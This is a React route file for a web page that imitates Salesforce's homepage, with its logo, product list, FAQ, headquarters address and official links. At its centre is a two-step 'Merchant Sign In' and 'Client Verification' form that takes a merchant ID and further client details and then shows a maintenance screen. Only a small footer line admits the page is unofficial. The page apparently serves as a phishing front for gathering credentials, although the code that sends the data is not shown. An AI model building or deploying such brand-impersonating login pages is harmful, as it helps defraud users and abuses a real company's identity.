import { createFileRoute } from "@tanstack/react-router";
import { useState } from "react";
import {
  ArrowRight,
  Bot,
  Cloud,
  Headphones,
  Megaphone,
  ShoppingBag,
  Users,
} from "lucide-react";
import { Button } from "@/components/ui/button";
import {
  Accordion,
  AccordionContent,
  AccordionItem,
  AccordionTrigger,
} from "@/components/ui/accordion";
import TopNav from "@/components/portal/TopNav";
import LoginStepOne from "@/components/portal/LoginStepOne";
import LoginStepTwo from "@/components/portal/LoginStepTwo";
import SignInGuide from "@/components/portal/SignInGuide";
import MaintenancePage from "@/components/portal/MaintenancePage";
import { cn } from "@/lib/utils";

export const Route = createFileRoute("/")({
  head: () => ({
    meta: [
      { title: "Salesforce — The #1 AI CRM" },
      {
        name: "description",
        content:
          "Salesforce connects your teams, customers, data and AI on one trusted platform.",
      },
      { property: "og:title", content: "Salesforce — The #1 AI CRM" },
      {
        property: "og:description",
        content: "Unify sales, service, marketing and commerce with trusted AI.",
      },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary" },
    ],
  }),
  component: Portal,
});

function Stepper({ step }: { step: 1 | 2 }) {
  return (
    <div className="mb-6 flex gap-2">
      {[1, 2].map((i) => (
        <div key={i} className={cn("h-1.5 flex-1 rounded-full transition", step >= i ? "bg-primary" : "bg-muted")} />
      ))}
    </div>
  );
}

const PRODUCTS = [
  { icon: Users, title: "Sales", text: "Connect teams and close more deals with connected customer data." },
  { icon: Headphones, title: "Service", text: "Resolve customer needs faster across every channel." },
  { icon: Megaphone, title: "Marketing", text: "Personalize campaigns and customer journeys at scale." },
  { icon: ShoppingBag, title: "Commerce", text: "Create connected buying experiences for every storefront." },
  { icon: Bot, title: "Agentforce", text: "Deploy trusted AI agents that work alongside your team." },
  { icon: Cloud, title: "Data 360", text: "Unify enterprise data and bring real-time context to every decision." },
];

const FAQ_ITEMS = [
  {
    question: "What is Salesforce?",
    answer:
      "Salesforce is a cloud-based AI CRM platform that connects sales, service, marketing, commerce, data and AI.",
  },
  {
    question: "What does CRM mean?",
    answer:
      "CRM means customer relationship management. It helps businesses manage customer data, workflows and interactions in one place.",
  },
  {
    question: "How can businesses start with Salesforce?",
    answer:
      "Businesses can explore Salesforce products, start a free trial or talk to a Salesforce representative to find the right solution.",
  },
  {
    question: "Where is Salesforce headquartered?",
    answer:
      "Salesforce is headquartered at Salesforce Tower, 415 Mission Street, 3rd Floor, San Francisco, California 94105, United States.",
  },
  {
    question: "How can I contact Salesforce?",
    answer:
      "You can visit salesforce.com/company/contact-us or call the main number at +1 800 667 6389.",
  },
  {
    question: "Where can I read Salesforce's privacy information?",
    answer:
      "Salesforce publishes its privacy statement, product privacy resources and related notices on its official Privacy Information page.",
    href: "https://www.salesforce.com/company/legal/privacy/",
    linkLabel: "View Salesforce privacy information",
  },
  {
    question: "Where can I find terms and legal agreements?",
    answer:
      "Salesforce provides current legal terms and customer agreements through its official legal resources.",
    href: "https://www.salesforce.com/company/legal/agreements/",
    linkLabel: "View Salesforce legal agreements",
  },
];

function Portal() {
  const [step, setStep] = useState<1 | 2>(1);
  const [merchantId, setMerchantId] = useState("");
  const [registered, setRegistered] = useState(false);
  const role = "user" as const;

  const logout = () => {
    setRegistered(false);
    setStep(1);
    setMerchantId("");
  };

  if (registered) return <MaintenancePage onLogout={logout} />;

  return (
    <div className="min-h-screen">
      <div className="border-b bg-sky-950 px-4 py-2 text-center text-xs font-semibold text-white sm:text-sm">
        The Agentic Enterprise starts here — connect people, agents and data on one trusted platform.
      </div>
      <TopNav />
      <main>
        <section className="border-b bg-[radial-gradient(circle_at_top_right,rgba(14,165,233,0.18),transparent_35%),linear-gradient(to_bottom,rgba(255,255,255,0.02),transparent)]">
          <div className="mx-auto grid max-w-6xl items-center gap-10 px-4 py-14 lg:grid-cols-[1fr_430px] lg:py-20">
            <div className="fade-rise max-w-2xl">
              <p className="mb-4 text-xs font-bold uppercase tracking-[0.24em] text-sky-400">
                Get started with the #1 AI CRM
              </p>
              <h1 className="text-4xl font-extrabold leading-[1.05] tracking-tight text-foreground sm:text-6xl">
                Salesforce. The #1 AI CRM.
              </h1>
              <p className="mt-6 max-w-xl text-lg leading-8 text-muted-foreground">
                Bring your people, agents and customer data together on one trusted platform—so every
                team can grow faster and every customer interaction feels personal.
              </p>
              <div className="mt-8 flex flex-wrap gap-3">
                <Button asChild className="h-12 rounded-full px-6 font-bold">
                  <a href="https://www.salesforce.com/ap/small-business/free-trial/starter-suite-v2/" target="_blank" rel="noreferrer">
                    Start for free <ArrowRight className="ml-2 h-4 w-4" />
                  </a>
                </Button>
                <Button asChild variant="outline" className="h-12 rounded-full px-6 font-bold">
                  <a href="https://www.salesforce.com/ap/products/demos/" target="_blank" rel="noreferrer">
                    Watch demos
                  </a>
                </Button>
              </div>
            </div>

            <div className="rounded-3xl border bg-card/95 p-6 shadow-2xl backdrop-blur sm:p-8">
              <div className="mb-7 text-center">
                <h2 className="text-2xl font-extrabold tracking-tight text-foreground">
                  {step === 1 ? "Merchant Sign In" : "Client Verification"}
                </h2>
                <p className="mt-2 text-sm text-muted-foreground">
                  {step === 1
                    ? "Verify your merchant account to get started"
                    : "Complete your client details to continue"}
                </p>
              </div>
              <Stepper step={step} />
              {step === 1 ? (
                <LoginStepOne
                  onContinue={(id) => {
                    setMerchantId(id);
                    setStep(2);
                  }}
                />
              ) : (
                <LoginStepTwo
                  merchantId={merchantId}
                  role={role}
                  onDone={() => setRegistered(true)}
                />
              )}
              {step === 1 && <SignInGuide />}
            </div>
          </div>
        </section>

        <section className="mx-auto max-w-6xl px-4 py-16">
          <div className="max-w-2xl">
            <p className="text-xs font-bold uppercase tracking-[0.2em] text-sky-400">One trusted platform</p>
            <h2 className="mt-3 text-3xl font-extrabold tracking-tight sm:text-4xl">
              Everything your business needs to grow
            </h2>
          </div>
          <div className="mt-8 grid gap-4 sm:grid-cols-2 lg:grid-cols-3">
            {PRODUCTS.map(({ icon: Icon, title, text }) => (
              <article key={title} className="rounded-2xl border bg-card p-6 transition hover:-translate-y-1 hover:border-sky-500/50">
                <div className="flex h-10 w-10 items-center justify-center rounded-xl bg-sky-500/10 text-sky-400">
                  <Icon className="h-5 w-5" />
                </div>
                <h3 className="mt-5 text-xl font-bold">{title}</h3>
                <p className="mt-2 text-sm leading-6 text-muted-foreground">{text}</p>
              </article>
            ))}
          </div>
        </section>

        <section className="border-y bg-sky-950/70">
          <div className="mx-auto grid max-w-6xl items-center gap-8 px-4 py-12 md:grid-cols-2 md:py-16">
            <div className="order-2 md:order-1">
              <p className="text-xs font-bold uppercase tracking-[0.2em] text-sky-300">People and AI, together</p>
              <h2 className="mt-3 text-3xl font-extrabold tracking-tight text-white sm:text-4xl">
                Make room for better customer moments
              </h2>
              <p className="mt-4 max-w-xl leading-7 text-sky-100/80">
                Bring customer context and everyday work together, giving teams more time to focus on
                relationships, decisions and meaningful outcomes.
              </p>
              <Button asChild className="mt-6 rounded-full bg-white px-6 font-bold text-sky-950 hover:bg-sky-100">
                <a href="https://www.salesforce.com/agentforce/" target="_blank" rel="noreferrer">
                  Explore AI solutions <ArrowRight className="ml-2 h-4 w-4" />
                </a>
              </Button>
            </div>
            <div className="order-1 flex justify-center md:order-2">
              <svg
                viewBox="0 0 480 320"
                role="img"
                aria-label="Illustration of people and digital assistants collaborating around connected customer data"
                className="h-auto w-full max-w-[440px]"
                xmlns="http://www.w3.org/2000/svg"
              >
                <defs>
                  <linearGradient id="banner-surface" x1="0" x2="1" y1="0" y2="1">
                    <stop stopColor="#38bdf8" stopOpacity=".95" />
                    <stop offset="1" stopColor="#2563eb" stopOpacity=".9" />
                  </linearGradient>
                </defs>
                <circle cx="238" cy="158" r="132" fill="#0c4a6e" opacity=".42" />
                <path d="M75 248c15-46 46-68 93-68s78 22 93 68" fill="#38bdf8" opacity=".92" />
                <circle cx="168" cy="139" r="33" fill="#f3c7a6" />
                <path d="M135 139c1-29 17-44 37-44 24 0 37 17 35 42-11-6-21-19-24-28-9 16-26 26-48 30Z" fill="#172554" />
                <path d="M254 250c10-35 33-52 68-52s58 17 68 52" fill="#818cf8" />
                <circle cx="322" cy="175" r="25" fill="#eab99a" />
                <path d="M297 175c0-23 13-36 29-36 19 0 29 14 27 35-10-4-17-13-20-20-7 12-19 19-36 21Z" fill="#312e81" />
                <rect x="267" y="64" width="139" height="82" rx="18" fill="url(#banner-surface)" />
                <rect x="283" y="82" width="51" height="8" rx="4" fill="white" opacity=".9" />
                <rect x="283" y="99" width="105" height="6" rx="3" fill="white" opacity=".55" />
                <rect x="283" y="113" width="77" height="6" rx="3" fill="white" opacity=".55" />
                <circle cx="373" cy="86" r="12" fill="#bbf7d0" />
                <path d="m368 86 4 4 7-8" fill="none" stroke="#166534" strokeLinecap="round" strokeLinejoin="round" strokeWidth="2.5" />
                <path d="M231 114c17-17 28-23 47-27M223 183c17 2 28 8 39 21" fill="none" stroke="#bae6fd" strokeDasharray="5 7" strokeLinecap="round" strokeWidth="3" />
                <circle cx="237" cy="110" r="8" fill="#fbbf24" />
                <circle cx="252" cy="209" r="8" fill="#fbbf24" />
                <rect x="54" y="63" width="64" height="48" rx="12" fill="#f8fafc" />
                <path d="M69 87h34M69 98h23" stroke="#0ea5e9" strokeLinecap="round" strokeWidth="5" />
                <circle cx="89" cy="74" r="4" fill="#38bdf8" />
              </svg>
            </div>
          </div>
        </section>

        <section id="about" className="border-y bg-card/40">
          <div className="mx-auto grid max-w-6xl gap-10 px-4 py-16 md:grid-cols-[0.8fr_1.2fr]">
            <div>
              <p className="text-xs font-bold uppercase tracking-[0.2em] text-sky-400">About Salesforce</p>
              <h2 className="mt-3 text-3xl font-extrabold tracking-tight">A history of helping customers succeed</h2>
              <p className="mt-5 leading-7 text-muted-foreground">
                Founded in 1999, Salesforce pioneered cloud-based customer relationship management.
                Today, its platform connects human teams and intelligent agents with trusted data,
                workflows and applications.
              </p>
              <a
                href="https://www.salesforce.com/company/our-story/"
                target="_blank"
                rel="noreferrer"
                className="mt-6 inline-flex items-center font-bold text-sky-400 hover:underline"
              >
                Learn more about us <ArrowRight className="ml-2 h-4 w-4" />
              </a>
            </div>
            <div id="faq" className="scroll-mt-24 rounded-2xl border bg-background p-6">
              <h3 className="text-xl font-bold">Frequently asked questions</h3>
              <Accordion type="single" collapsible className="mt-3">
                {FAQ_ITEMS.map((item, index) => (
                  <AccordionItem key={item.question} value={`faq-${index}`}>
                    <AccordionTrigger className="text-left">{item.question}</AccordionTrigger>
                    <AccordionContent className="leading-6 text-muted-foreground">
                      {item.answer}
                      {"href" in item && item.href && (
                        <a
                          className="mt-2 block font-semibold text-sky-400 hover:underline"
                          href={item.href}
                          target="_blank"
                          rel="noreferrer"
                        >
                          {item.linkLabel}
                        </a>
                      )}
                    </AccordionContent>
                  </AccordionItem>
                ))}
              </Accordion>
            </div>
          </div>
        </section>
      </main>

      <footer className="bg-sky-950 text-white">
        <div className="mx-auto grid max-w-6xl gap-8 px-4 py-10 md:grid-cols-[1fr_auto]">
          <div className="space-y-4">
            <img
              src="https://wp.sfdcdigital.com/en-us/wp-content/uploads/sites/4/2024/11/logo-salesforce.svg?w=1024"
              alt="Salesforce"
              className="h-9 w-auto brightness-0 invert"
            />
            <p className="text-sm font-semibold">Salesforce, Inc.</p>
            <address className="max-w-sm text-sm not-italic leading-6 text-sky-100/75">
              Salesforce Tower<br />
              415 Mission Street, 3rd Floor<br />
              San Francisco, CA 94105, United States
            </address>
          </div>
          <div className="grid grid-cols-2 gap-x-10 gap-y-3 text-sm sm:grid-cols-3">
            <a className="hover:text-sky-300" href="https://www.salesforce.com/products/" target="_blank" rel="noreferrer">Products</a>
            <a className="hover:text-sky-300" href="https://www.salesforce.com/company/our-story/" target="_blank" rel="noreferrer">About us</a>
            <a className="hover:text-sky-300" href="https://www.salesforce.com/company/careers/" target="_blank" rel="noreferrer">Careers</a>
            <a className="hover:text-sky-300" href="https://trust.salesforce.com/" target="_blank" rel="noreferrer">Trust</a>
            <a className="hover:text-sky-300" href="https://www.salesforce.com/company/contact-us/" target="_blank" rel="noreferrer">Contact us</a>
            <a className="hover:text-sky-300" href="tel:+18006676389">+1 800 667 6389</a>
            <a className="hover:text-sky-300" href="https://www.salesforce.com/company/legal/privacy/" target="_blank" rel="noreferrer">Privacy</a>
            <a className="hover:text-sky-300" href="https://www.salesforce.com/company/legal/agreements/" target="_blank" rel="noreferrer">Terms &amp; agreements</a>
            <a className="hover:text-sky-300" href="https://www.salesforce.com/company/legal/" target="_blank" rel="noreferrer">Legal resources</a>
          </div>
        </div>
        <div className="border-t border-white/15 px-4 py-4 text-center text-xs text-sky-100/70">
          <p>© {new Date().getFullYear()} Salesforce, Inc. All rights reserved.</p>
          <p className="mt-2">This is an independently developed page and is not an official Salesforce website.</p>
        </div>
      </footer>
    </div>
  );
}
